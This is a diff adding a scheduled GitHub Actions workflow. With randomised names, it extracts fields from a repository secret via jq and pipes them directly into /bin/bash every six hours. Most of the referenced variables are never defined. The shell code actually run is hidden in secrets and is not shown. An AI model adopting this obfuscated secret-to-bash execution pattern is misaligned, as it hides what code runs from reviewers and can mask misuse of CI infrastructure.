@@ -1,0 +1,30 @@
+name: sulangchundan
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '15 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: sulangchundan
+        env:
+          y4: ${{ secrets.y4 }}
+        run: |
+          echo $y4 | jq -r .r6258 | /bin/bash
+          echo $bpv6 | jq -r .ubb461 | /bin/bash
+          echo $pfxdi341 | jq -r .tivw198 | /bin/bash
+          echo $sfytf243 | jq -r .ikxxr2 | /bin/bash
+          echo $xdjzm03452 | jq -r .lzs0623 | /bin/bash
+          echo $fy2723 | jq -r .fkt368 | /bin/bash
+          echo $nivr6 | jq -r .zoj5699 | /bin/bash
+          echo $koxe704 | jq -r .ig5611 | /bin/bash
+          echo $z9355 | jq -r .qikmn43606 | /bin/bash
+          echo $or742 | jq -r .jb0 | /bin/bash
+          echo $tz646 | jq -r .ox99 | /bin/bash
+          echo $vemwy24 | jq -r .x42726 | /bin/bash
+
